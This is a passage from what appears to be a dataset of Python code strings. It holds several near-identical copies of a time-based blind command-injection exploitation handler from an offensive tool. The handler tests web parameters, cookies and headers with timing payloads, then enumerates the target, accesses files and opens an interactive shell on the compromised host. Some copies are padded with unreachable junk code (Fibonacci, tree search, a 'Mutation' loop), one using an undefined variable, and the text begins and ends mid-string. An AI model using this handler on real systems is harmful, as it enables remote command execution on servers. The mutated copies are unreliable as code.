print(settings.SINGLE_WHITESPACE)\n                                err_msg = 'Exiting, due to EOFError.'\n                                print(settings.print_error_msg(err_msg))\n                                raise\n                            except:\n                                percent = num_of_chars * 100 / total\n                                float_percent = '{0:.1f}'.format(round(num_of_chars * 100 / (total * 1.0), 2))\n                                if str(float_percent) == '100.0':\n                                    if no_result == True:\n                                        if settings.VERBOSITY_LEVEL == 0:\n                                            percent = settings.FAIL_STATUS\n                                            info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.' + '' + percent + ''\n                                            sys.stdout.write('\\r' + settings.print_info_msg(info_msg))\n                                            sys.stdout.flush()\n                                        else:\n                                            percent = ''\n                                    else:\n                                        percent = '.. (' + str(float_percent) + '%)'\n                                        print(settings.SINGLE_WHITESPACE)\n                                        logs.logs_notification(filename)\n                                else:\n                                    percent = '.. (' + str(float_percent) + '%)'\n                            break\n                    if url_time_response == 0 and how_long - timesec >= 0 or (url_time_response != 0 and how_long - timesec == 0 and (how_long == timesec)) or (url_time_response != 0 and how_long - timesec > 0 and (how_long >= timesec + 1)):\n                        if len(TAG) == output_length and (possibly_vulnerable == True or (settings.LOAD_SESSION and int(is_vulnerable) == menu.options.level)):\n                            found = True\n                            no_result = False\n                            settings.DETECTION_PHASE = False\n                            settings.EXPLOITATION_PHASE = True\n                            if settings.LOAD_SESSION:\n                                possibly_vulnerable = False\n                            if settings.COOKIE_INJECTION == True:\n                                header_name = ' cookie'\n                                found_vuln_parameter = vuln_parameter\n                                the_type = ' parameter'\n                            elif settings.USER_AGENT_INJECTION == True:\n                                header_name = ' User-Agent'\n                                found_vuln_parameter = ''\n                                the_type = ' HTTP header'\n                            elif settings.REFERER_INJECTION == True:\n                                header_name = ' Referer'\n                                found_vuln_parameter = ''\n                                the_type = ' HTTP header'\n                            elif settings.CUSTOM_HEADER_INJECTION == True:\n                                header_name = settings.SINGLE_WHITESPACE + settings.CUSTOM_HEADER_NAME\n                                found_vuln_parameter = ''\n                                the_type = ' HTTP header'\n                            else:\n                                header_name = ''\n                                the_type = ' parameter'\n                                if not settings.USER_DEFINED_POST_DATA:\n                                    found_vuln_parameter = parameters.vuln_GET_param(url)\n                                else:\n                                    found_vuln_parameter = vuln_parameter\n                            if len(found_vuln_parameter) != 0:\n                                found_vuln_parameter = \" '\" + found_vuln_parameter + Style.RESET_ALL + Style.BRIGHT + \"'\"\n                            if export_injection_info == False:\n                                export_injection_info = logs.add_type_and_technique(export_injection_info, filename, injection_type, technique)\n                            if vp_flag == True:\n                                vp_flag = logs.add_parameter(vp_flag, filename, the_type, header_name, http_request_method, vuln_parameter, payload)\n                            logs.update_payload(filename, counter, payload)\n                            counter = counter + 1\n                            if not settings.LOAD_SESSION:\n                                if settings.VERBOSITY_LEVEL == 0:\n                                    print(settings.SINGLE_WHITESPACE)\n                                else:\n                                    checks.total_of_requests()\n                            info_msg = settings.CHECKING_PARAMETER + ' appears to be injectable via '\n                            info_msg += '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.'\n                            print(settings.print_bold_info_msg(info_msg))\n                            sub_content = str(checks.url_decode(payload))\n                            print(settings.print_sub_content(sub_content))\n                            if not settings.LOAD_SESSION:\n                                shell = ''\n                                session_handler.injection_point_importation(url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, timesec, original_how_long, output_length, is_vulnerable=menu.options.level)\n                            else:\n                                whitespace = settings.WHITESPACES[0]\n                                settings.LOAD_SESSION = False\n                            if settings.ENUMERATION_DONE == True:\n                                while True:\n                                    message = 'Do you want to ignore stored session and enumerate again? [y/N] > '\n                                    enumerate_again = common.read_input(message, default='N', check_batch=True)\n                                    if enumerate_again in settings.CHOICE_YES:\n                                        if not menu.options.ignore_session:\n                                            menu.options.ignore_session = True\n                                        tb_enumeration.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)\n                                        break\n                                    elif enumerate_again in settings.CHOICE_NO:\n                                        break\n                                    elif enumerate_again in settings.CHOICE_QUIT:\n                                        raise SystemExit()\n                                    else:\n                                        common.invalid_option(enumerate_again)\n                                        pass\n                            elif menu.enumeration_options():\n                                tb_enumeration.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)\n                            if settings.FILE_ACCESS_DONE == True:\n                                while True:\n                                    message = 'Do you want to ignore stored session and access files again? [y/N] > '\n                                    file_access_again = common.read_input(message, default='N', check_batch=True)\n                                    if file_access_again in settings.CHOICE_YES:\n                                        if not menu.options.ignore_session:\n                                            menu.options.ignore_session = True\n                                        tb_file_access.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)\n                                        break\n                                    elif file_access_again in settings.CHOICE_NO:\n                                        break\n                                    elif file_access_again in settings.CHOICE_QUIT:\n                                        raise SystemExit()\n                                    else:\n                                        common.invalid_option(file_access_again)\n                                        pass\n                            elif menu.file_access_options():\n                                tb_file_access.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)\n                            if menu.options.os_cmd:\n                                cmd = menu.options.os_cmd\n                                (check_how_long, output) = tb_enumeration.single_os_cmd_exec(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)\n                            try:\n                                checks.alert()\n                                go_back = False\n                                go_back_again = False\n                                while True:\n                                    if go_back == True:\n                                        break\n                                    message = settings.CHECKING_PARAMETER + ' is vulnerable. Do you want to prompt for a pseudo-terminal shell? [Y/n] > '\n                                    if settings.CRAWLING:\n                                        settings.CRAWLED_URLS_INJECTED.append(_urllib.parse.urlparse(url).netloc)\n                                    if not settings.STDIN_PARSING:\n                                        gotshell = common.read_input(message, default='Y', check_batch=True)\n                                    else:\n                                        gotshell = common.read_input(message, default='n', check_batch=True)\n                                    if gotshell in settings.CHOICE_YES:\n                                        print(settings.OS_SHELL_TITLE)\n                                        if settings.READLINE_ERROR:\n                                            checks.no_readline_module()\n                                        while True:\n                                            if false_positive_warning:\n                                                warn_msg = 'Due to unexpected time delays, it is highly '\n                                                warn_msg += \"recommended to enable the 'reverse_tcp' option.\\n\"\n                                                sys.stdout.write('\\r' + settings.print_warning_msg(warn_msg))\n                                                false_positive_warning = False\n                                            if not settings.READLINE_ERROR:\n                                                checks.tab_autocompleter()\n                                            sys.stdout.write(settings.OS_SHELL)\n                                            cmd = common.read_input(message='', default='os_shell', check_batch=True)\n                                            cmd = checks.escaped_cmd(cmd)\n                                            if cmd.lower() in settings.SHELL_OPTIONS:\n                                                (go_back, go_back_again) = shell_options.check_option(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique, go_back, no_result, timesec, go_back_again, payload, OUTPUT_TEXTFILE='')\n                                                if go_back and go_back_again == False:\n                                                    break\n                                                if go_back and go_back_again:\n                                                    return True\n                                            else:\n                                                if menu.options.ignore_session or session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:\n                                                    (check_how_long, output) = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)\n                                                    tb_injector.export_injection_results(cmd, separator, output, check_how_long)\n                                                    if not menu.options.ignore_session:\n                                                        session_handler.store_cmd(url, cmd, output, vuln_parameter)\n                                                else:\n                                                    output = session_handler.export_stored_cmd(url, cmd, vuln_parameter)\n                                                    print(settings.print_output(output))\n                                                logs.executed_command(filename, cmd, output)\n                                    elif gotshell in settings.CHOICE_NO:\n                                        if checks.next_attack_vector(technique, go_back) == True:\n                                            break\n                                        elif no_result == True:\n                                            return False\n                                        else:\n                                            return True\n                                    elif gotshell in settings.CHOICE_QUIT:\n                                        raise SystemExit()\n                                    else:\n                                        common.invalid_option(gotshell)\n                                        pass\n                            except (KeyboardInterrupt, SystemExit):\n                                raise\n                            except EOFError:\n                                if settings.STDIN_PARSING:\n                                    print(settings.SINGLE_WHITESPACE)\n                                err_msg = 'Exiting, due to EOFError.'\n                                print(settings.print_error_msg(err_msg))\n                                raise\n    if no_result == True:\n        if settings.VERBOSITY_LEVEL == 0:\n            print(settings.SINGLE_WHITESPACE)\n        return False\n    else:\n        sys.stdout.write('\\r')\n        sys.stdout.flush()",
            "def tb_injection_handler(url, timesec, filename, http_request_method, url_time_response, injection_type, technique):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    counter = 1\n    num_of_chars = 1\n    vp_flag = True\n    no_result = True\n    is_encoded = False\n    possibly_vulnerable = False\n    false_positive_warning = False\n    export_injection_info = False\n    how_long = 0\n    if settings.VERBOSITY_LEVEL != 0:\n        info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '. '\n        print(settings.print_info_msg(info_msg))\n    if menu.options.maxlen:\n        settings.MAXLEN = maxlen = menu.options.maxlen\n    if menu.options.url_reload == True:\n        warn_msg = \"The '--url-reload' option is not available in \" + technique + '.'\n        print(settings.print_warning_msg(warn_msg))\n    total = len(settings.WHITESPACES) * len(settings.PREFIXES) * len(settings.SEPARATORS) * len(settings.SUFFIXES)\n    for whitespace in settings.WHITESPACES:\n        for prefix in settings.PREFIXES:\n            for suffix in settings.SUFFIXES:\n                for separator in settings.SEPARATORS:\n                    settings.DETECTION_PHASE = True\n                    settings.EXPLOITATION_PHASE = False\n                    how_long_statistic = []\n                    if settings.LOAD_SESSION and session_handler.notification(url, technique, injection_type):\n                        try:\n                            settings.TIME_BASED_STATE = True\n                            cmd = shell = ''\n                            (url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, timesec, how_long, output_length, is_vulnerable) = session_handler.injection_point_exportation(url, http_request_method)\n                            checks.check_for_stored_tamper(payload)\n                            settings.FOUND_HOW_LONG = how_long\n                            settings.FOUND_DIFF = how_long - timesec\n                        except TypeError:\n                            err_msg = \"An error occurred while accessing session file ('\"\n                            err_msg += settings.SESSION_FILE + \"'). \"\n                            err_msg += \"Use the '--flush-session' option.\"\n                            print(settings.print_critical_msg(err_msg))\n                            raise SystemExit()\n                    if settings.RETEST == True:\n                        settings.RETEST = False\n                        from src.core.injections.results_based.techniques.classic import cb_handler\n                        cb_handler.exploitation(url, timesec, filename, http_request_method, injection_type, technique)\n                    if not settings.LOAD_SESSION:\n                        num_of_chars = num_of_chars + 1\n                        combination = prefix + separator\n                        if combination in settings.JUNK_COMBINATION:\n                            prefix = ''\n                        alter_shell = menu.options.alter_shell\n                        TAG = ''.join((random.choice(string.ascii_uppercase) for num_of_chars in range(6)))\n                        tag_length = len(TAG) + 4\n                        for output_length in range(1, int(tag_length)):\n                            try:\n                                if alter_shell:\n                                    payload = tb_payloads.decision_alter_shell(separator, TAG, output_length, timesec, http_request_method)\n                                else:\n                                    payload = tb_payloads.decision(separator, TAG, output_length, timesec, http_request_method)\n                                payload = parameters.prefixes(payload, prefix)\n                                payload = parameters.suffixes(payload, suffix)\n                                payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)\n                                payload = checks.perform_payload_modification(payload)\n                                if settings.VERBOSITY_LEVEL != 0:\n                                    payload_msg = payload.replace('\\n', '\\\\n')\n                                    print(settings.print_payload(payload_msg))\n                                if settings.COOKIE_INJECTION == True:\n                                    vuln_parameter = parameters.specify_cookie_parameter(menu.options.cookie)\n                                    how_long = tb_injector.cookie_injection_test(url, vuln_parameter, payload)\n                                elif settings.USER_AGENT_INJECTION == True:\n                                    vuln_parameter = parameters.specify_user_agent_parameter(menu.options.agent)\n                                    how_long = tb_injector.user_agent_injection_test(url, vuln_parameter, payload)\n                                elif settings.REFERER_INJECTION == True:\n                                    vuln_parameter = parameters.specify_referer_parameter(menu.options.referer)\n                                    how_long = tb_injector.referer_injection_test(url, vuln_parameter, payload)\n                                elif settings.HOST_INJECTION == True:\n                                    vuln_parameter = parameters.specify_host_parameter(menu.options.host)\n                                    how_long = tb_injector.host_injection_test(url, vuln_parameter, payload)\n                                elif settings.CUSTOM_HEADER_INJECTION == True:\n                                    vuln_parameter = parameters.specify_custom_header_parameter(settings.INJECT_TAG)\n                                    how_long = tb_injector.custom_header_injection_test(url, vuln_parameter, payload)\n                                else:\n                                    (how_long, vuln_parameter) = tb_injector.injection_test(payload, http_request_method, url)\n                                how_long_statistic.append(how_long)\n                                percent = num_of_chars * 100 / total\n                                float_percent = '{0:.1f}'.format(round(num_of_chars * 100 / (total * 1.0), 2))\n                                if percent == 100 and no_result == True:\n                                    if settings.VERBOSITY_LEVEL == 0:\n                                        percent = settings.FAIL_STATUS\n                                    else:\n                                        percent = ''\n                                elif url_time_response == 0 and how_long - timesec >= 0 or (url_time_response != 0 and how_long - timesec == 0 and (how_long == timesec)) or (url_time_response != 0 and how_long - timesec > 0 and (how_long >= timesec + 1)):\n                                    false_positive_fixation = False\n                                    if len(TAG) == output_length:\n                                        statistical_anomaly = True\n                                        if len(set(how_long_statistic[0:5])) == 1:\n                                            if max(xrange(len(how_long_statistic)), key=lambda x: how_long_statistic[x]) == len(TAG) - 1:\n                                                statistical_anomaly = False\n                                                how_long_statistic = []\n                                        if timesec <= how_long and (not statistical_anomaly):\n                                            false_positive_fixation = True\n                                        else:\n                                            false_positive_warning = True\n                                    if false_positive_warning:\n                                        message = 'Unexpected time delays have been identified due to unstable '\n                                        message += 'requests. This behavior may lead to false positive results. '\n                                        sys.stdout.write('\\r')\n                                        while True:\n                                            message = message + 'How do you want to proceed? [(C)ontinue/(s)kip/(q)uit] > '\n                                            proceed_option = common.read_input(message, default='C', check_batch=True)\n                                            if proceed_option.lower() in settings.CHOICE_PROCEED:\n                                                if proceed_option.lower() == 's':\n                                                    false_positive_fixation = False\n                                                    raise\n                                                elif proceed_option.lower() == 'c':\n                                                    timesec = timesec + 1\n                                                    false_positive_fixation = True\n                                                    break\n                                                elif proceed_option.lower() == 'q':\n                                                    raise SystemExit()\n                                            else:\n                                                common.invalid_option(proceed_option)\n                                                pass\n                                    if settings.VERBOSITY_LEVEL == 0:\n                                        percent = '.. (' + str(float_percent) + '%)'\n                                        info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.' + '' + percent + ''\n                                        sys.stdout.write('\\r' + settings.print_info_msg(info_msg))\n                                        sys.stdout.flush()\n                                    if false_positive_fixation:\n                                        false_positive_fixation = False\n                                        settings.FOUND_HOW_LONG = how_long\n                                        settings.FOUND_DIFF = how_long - timesec\n                                        if false_positive_warning:\n                                            time.sleep(1)\n                                        randv1 = random.randrange(1, 10)\n                                        randv2 = random.randrange(1, 10)\n                                        randvcalc = randv1 + randv2\n                                        if settings.TARGET_OS == settings.OS.WINDOWS:\n                                            if alter_shell:\n                                                cmd = settings.WIN_PYTHON_INTERPRETER + 'python.exe -c \"print (' + str(randv1) + ' + ' + str(randv2) + ')\"'\n                                            else:\n                                                rand_num = randv1 + randv2\n                                                cmd = 'powershell.exe -InputFormat none write (' + str(rand_num) + ')'\n                                        else:\n                                            cmd = 'expr ' + str(randv1) + ' %2B ' + str(randv2) + ''\n                                        original_how_long = how_long\n                                        (how_long, output) = tb_injector.false_positive_check(separator, TAG, cmd, whitespace, prefix, suffix, timesec, http_request_method, url, vuln_parameter, randvcalc, alter_shell, how_long, url_time_response, false_positive_warning)\n                                        if url_time_response == 0 and how_long - timesec >= 0 or (url_time_response != 0 and how_long - timesec == 0 and (how_long == timesec)) or (url_time_response != 0 and how_long - timesec > 0 and (how_long >= timesec + 1)):\n                                            if str(output) == str(randvcalc) and len(TAG) == output_length:\n                                                possibly_vulnerable = True\n                                                how_long_statistic = 0\n                                                if settings.VERBOSITY_LEVEL == 0:\n                                                    percent = settings.info_msg\n                                                else:\n                                                    percent = ''\n                                        else:\n                                            break\n                                    else:\n                                        if settings.VERBOSITY_LEVEL == 0:\n                                            percent = '.. (' + str(float_percent) + '%)'\n                                            info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.' + '' + percent + ''\n                                            sys.stdout.write('\\r' + settings.print_info_msg(info_msg))\n                                            sys.stdout.flush()\n                                        continue\n                                else:\n                                    if settings.VERBOSITY_LEVEL == 0:\n                                        percent = '.. (' + str(float_percent) + '%)'\n                                        info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.' + '' + percent + ''\n                                        sys.stdout.write('\\r' + settings.print_info_msg(info_msg))\n                                        sys.stdout.flush()\n                                    continue\n                            except (KeyboardInterrupt, SystemExit):\n                                print(settings.SINGLE_WHITESPACE)\n                                raise\n                            except EOFError:\n                                if settings.STDIN_PARSING:\n                                    print(settings.SINGLE_WHITESPACE)\n                                err_msg = 'Exiting, due to EOFError.'\n                                print(settings.print_error_msg(err_msg))\n                                raise\n                            except:\n                                percent = num_of_chars * 100 / total\n                                float_percent = '{0:.1f}'.format(round(num_of_chars * 100 / (total * 1.0), 2))\n                                if str(float_percent) == '100.0':\n                                    if no_result == True:\n                                        if settings.VERBOSITY_LEVEL == 0:\n                                            percent = settings.FAIL_STATUS\n                                            info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.' + '' + percent + ''\n                                            sys.stdout.write('\\r' + settings.print_info_msg(info_msg))\n                                            sys.stdout.flush()\n                                        else:\n                                            percent = ''\n                                    else:\n                                        percent = '.. (' + str(float_percent) + '%)'\n                                        print(settings.SINGLE_WHITESPACE)\n                                        logs.logs_notification(filename)\n                                else:\n                                    percent = '.. (' + str(float_percent) + '%)'\n                            break\n                    if url_time_response == 0 and how_long - timesec >= 0 or (url_time_response != 0 and how_long - timesec == 0 and (how_long == timesec)) or (url_time_response != 0 and how_long - timesec > 0 and (how_long >= timesec + 1)):\n                        if len(TAG) == output_length and (possibly_vulnerable == True or (settings.LOAD_SESSION and int(is_vulnerable) == menu.options.level)):\n                            found = True\n                            no_result = False\n                            settings.DETECTION_PHASE = False\n                            settings.EXPLOITATION_PHASE = True\n                            if settings.LOAD_SESSION:\n                                possibly_vulnerable = False\n                            if settings.COOKIE_INJECTION == True:\n                                header_name = ' cookie'\n                                found_vuln_parameter = vuln_parameter\n                                the_type = ' parameter'\n                            elif settings.USER_AGENT_INJECTION == True:\n                                header_name = ' User-Agent'\n                                found_vuln_parameter = ''\n                                the_type = ' HTTP header'\n                            elif settings.REFERER_INJECTION == True:\n                                header_name = ' Referer'\n                                found_vuln_parameter = ''\n                                the_type = ' HTTP header'\n                            elif settings.CUSTOM_HEADER_INJECTION == True:\n                                header_name = settings.SINGLE_WHITESPACE + settings.CUSTOM_HEADER_NAME\n                                found_vuln_parameter = ''\n                                the_type = ' HTTP header'\n                            else:\n                                header_name = ''\n                                the_type = ' parameter'\n                                if not settings.USER_DEFINED_POST_DATA:\n                                    found_vuln_parameter = parameters.vuln_GET_param(url)\n                                else:\n                                    found_vuln_parameter = vuln_parameter\n                            if len(found_vuln_parameter) != 0:\n                                found_vuln_parameter = \" '\" + found_vuln_parameter + Style.RESET_ALL + Style.BRIGHT + \"'\"\n                            if export_injection_info == False:\n                                export_injection_info = logs.add_type_and_technique(export_injection_info, filename, injection_type, technique)\n                            if vp_flag == True:\n                                vp_flag = logs.add_parameter(vp_flag, filename, the_type, header_name, http_request_method, vuln_parameter, payload)\n                            logs.update_payload(filename, counter, payload)\n                            counter = counter + 1\n                            if not settings.LOAD_SESSION:\n                                if settings.VERBOSITY_LEVEL == 0:\n                                    print(settings.SINGLE_WHITESPACE)\n                                else:\n                                    checks.total_of_requests()\n                            info_msg = settings.CHECKING_PARAMETER + ' appears to be injectable via '\n                            info_msg += '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.'\n                            print(settings.print_bold_info_msg(info_msg))\n                            sub_content = str(checks.url_decode(payload))\n                            print(settings.print_sub_content(sub_content))\n                            if not settings.LOAD_SESSION:\n                                shell = ''\n                                session_handler.injection_point_importation(url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, timesec, original_how_long, output_length, is_vulnerable=menu.options.level)\n                            else:\n                                whitespace = settings.WHITESPACES[0]\n                                settings.LOAD_SESSION = False\n                            if settings.ENUMERATION_DONE == True:\n                                while True:\n                                    message = 'Do you want to ignore stored session and enumerate again? [y/N] > '\n                                    enumerate_again = common.read_input(message, default='N', check_batch=True)\n                                    if enumerate_again in settings.CHOICE_YES:\n                                        if not menu.options.ignore_session:\n                                            menu.options.ignore_session = True\n                                        tb_enumeration.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)\n                                        break\n                                    elif enumerate_again in settings.CHOICE_NO:\n                                        break\n                                    elif enumerate_again in settings.CHOICE_QUIT:\n                                        raise SystemExit()\n                                    else:\n                                        common.invalid_option(enumerate_again)\n                                        pass\n                            elif menu.enumeration_options():\n                                tb_enumeration.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)\n                            if settings.FILE_ACCESS_DONE == True:\n                                while True:\n                                    message = 'Do you want to ignore stored session and access files again? [y/N] > '\n                                    file_access_again = common.read_input(message, default='N', check_batch=True)\n                                    if file_access_again in settings.CHOICE_YES:\n                                        if not menu.options.ignore_session:\n                                            menu.options.ignore_session = True\n                                        tb_file_access.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)\n                                        break\n                                    elif file_access_again in settings.CHOICE_NO:\n                                        break\n                                    elif file_access_again in settings.CHOICE_QUIT:\n                                        raise SystemExit()\n                                    else:\n                                        common.invalid_option(file_access_again)\n                                        pass\n                            elif menu.file_access_options():\n                                tb_file_access.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)\n                            if menu.options.os_cmd:\n                                cmd = menu.options.os_cmd\n                                (check_how_long, output) = tb_enumeration.single_os_cmd_exec(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)\n                            try:\n                                checks.alert()\n                                go_back = False\n                                go_back_again = False\n                                while True:\n                                    if go_back == True:\n                                        break\n                                    message = settings.CHECKING_PARAMETER + ' is vulnerable. Do you want to prompt for a pseudo-terminal shell? [Y/n] > '\n                                    if settings.CRAWLING:\n                                        settings.CRAWLED_URLS_INJECTED.append(_urllib.parse.urlparse(url).netloc)\n                                    if not settings.STDIN_PARSING:\n                                        gotshell = common.read_input(message, default='Y', check_batch=True)\n                                    else:\n                                        gotshell = common.read_input(message, default='n', check_batch=True)\n                                    if gotshell in settings.CHOICE_YES:\n                                        print(settings.OS_SHELL_TITLE)\n                                        if settings.READLINE_ERROR:\n                                            checks.no_readline_module()\n                                        while True:\n                                            if false_positive_warning:\n                                                warn_msg = 'Due to unexpected time delays, it is highly '\n                                                warn_msg += \"recommended to enable the 'reverse_tcp' option.\\n\"\n                                                sys.stdout.write('\\r' + settings.print_warning_msg(warn_msg))\n                                                false_positive_warning = False\n                                            if not settings.READLINE_ERROR:\n                                                checks.tab_autocompleter()\n                                            sys.stdout.write(settings.OS_SHELL)\n                                            cmd = common.read_input(message='', default='os_shell', check_batch=True)\n                                            cmd = checks.escaped_cmd(cmd)\n                                            if cmd.lower() in settings.SHELL_OPTIONS:\n                                                (go_back, go_back_again) = shell_options.check_option(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique, go_back, no_result, timesec, go_back_again, payload, OUTPUT_TEXTFILE='')\n                                                if go_back and go_back_again == False:\n                                                    break\n                                                if go_back and go_back_again:\n                                                    return True\n                                            else:\n                                                if menu.options.ignore_session or session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:\n                                                    (check_how_long, output) = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)\n                                                    tb_injector.export_injection_results(cmd, separator, output, check_how_long)\n                                                    if not menu.options.ignore_session:\n                                                        session_handler.store_cmd(url, cmd, output, vuln_parameter)\n                                                else:\n                                                    output = session_handler.export_stored_cmd(url, cmd, vuln_parameter)\n                                                    print(settings.print_output(output))\n                                                logs.executed_command(filename, cmd, output)\n                                    elif gotshell in settings.CHOICE_NO:\n                                        if checks.next_attack_vector(technique, go_back) == True:\n                                            break\n                                        elif no_result == True:\n                                            return False\n                                        else:\n                                            return True\n                                    elif gotshell in settings.CHOICE_QUIT:\n                                        raise SystemExit()\n                                    else:\n                                        common.invalid_option(gotshell)\n                                        pass\n                            except (KeyboardInterrupt, SystemExit):\n                                raise\n                            except EOFError:\n                                if settings.STDIN_PARSING:\n                                    print(settings.SINGLE_WHITESPACE)\n                                err_msg = 'Exiting, due to EOFError.'\n                                print(settings.print_error_msg(err_msg))\n                                raise\n    if no_result == True:\n        if settings.VERBOSITY_LEVEL == 0:\n            print(settings.SINGLE_WHITESPACE)\n        return False\n    else:\n        sys.stdout.write('\\r')\n        sys.stdout.flush()",
            "def tb_injection_handler(url, timesec, filename, http_request_method, url_time_response, injection_type, technique):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    counter = 1\n    num_of_chars = 1\n    vp_flag = True\n    no_result = True\n    is_encoded = False\n    possibly_vulnerable = False\n    false_positive_warning = False\n    export_injection_info = False\n    how_long = 0\n    if settings.VERBOSITY_LEVEL != 0:\n        info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '. '\n        print(settings.print_info_msg(info_msg))\n    if menu.options.maxlen:\n        settings.MAXLEN = maxlen = menu.options.maxlen\n    if menu.options.url_reload == True:\n        warn_msg = \"The '--url-reload' option is not available in \" + technique + '.'\n        print(settings.print_warning_msg(warn_msg))\n    total = len(settings.WHITESPACES) * len(settings.PREFIXES) * len(settings.SEPARATORS) * len(settings.SUFFIXES)\n    for whitespace in settings.WHITESPACES:\n        for prefix in settings.PREFIXES:\n            for suffix in settings.SUFFIXES:\n                for separator in settings.SEPARATORS:\n                    settings.DETECTION_PHASE = True\n                    settings.EXPLOITATION_PHASE = False\n                    how_long_statistic = []\n                    if settings.LOAD_SESSION and session_handler.notification(url, technique, injection_type):\n                        try:\n                            settings.TIME_BASED_STATE = True\n                            cmd = shell = ''\n                            (url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, timesec, how_long, output_length, is_vulnerable) = session_handler.injection_point_exportation(url, http_request_method)\n                            checks.check_for_stored_tamper(payload)\n                            settings.FOUND_HOW_LONG = how_long\n                            settings.FOUND_DIFF = how_long - timesec\n                        except TypeError:\n                            err_msg = \"An error occurred while accessing session file ('\"\n                            err_msg += settings.SESSION_FILE + \"'). \"\n                            err_msg += \"Use the '--flush-session' option.\"\n                            print(settings.print_critical_msg(err_msg))\n                            raise SystemExit()\n                    if settings.RETEST == True:\n                        settings.RETEST = False\n                        from src.core.injections.results_based.techniques.classic import cb_handler\n                        cb_handler.exploitation(url, timesec, filename, http_request_method, injection_type, technique)\n                    if not settings.LOAD_SESSION:\n                        num_of_chars = num_of_chars + 1\n                        combination = prefix + separator\n                        if combination in settings.JUNK_COMBINATION:\n                            prefix = ''\n                        alter_shell = menu.options.alter_shell\n                        TAG = ''.join((random.choice(string.ascii_uppercase) for num_of_chars in range(6)))\n                        tag_length = len(TAG) + 4\n                        for output_length in range(1, int(tag_length)):\n                            try:\n                                if alter_shell:\n                                    payload = tb_payloads.decision_alter_shell(separator, TAG, output_length, timesec, http_request_method)\n                                else:\n                                    payload = tb_payloads.decision(separator, TAG, output_length, timesec, http_request_method)\n                                payload = parameters.prefixes(payload, prefix)\n                                payload = parameters.suffixes(payload, suffix)\n                                payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)\n                                payload = checks.perform_payload_modification(payload)\n                                if settings.VERBOSITY_LEVEL != 0:\n                                    payload_msg = payload.replace('\\n', '\\\\n')\n                                    print(settings.print_payload(payload_msg))\n                                if settings.COOKIE_INJECTION == True:\n                                    vuln_parameter = parameters.specify_cookie_parameter(menu.options.cookie)\n                                    how_long = tb_injector.cookie_injection_test(url, vuln_parameter, payload)\n                                elif settings.USER_AGENT_INJECTION == True:\n                                    vuln_parameter = parameters.specify_user_agent_parameter(menu.options.agent)\n                                    how_long = tb_injector.user_agent_injection_test(url, vuln_parameter, payload)\n                                elif settings.REFERER_INJECTION == True:\n                                    vuln_parameter = parameters.specify_referer_parameter(menu.options.referer)\n                                    how_long = tb_injector.referer_injection_test(url, vuln_parameter, 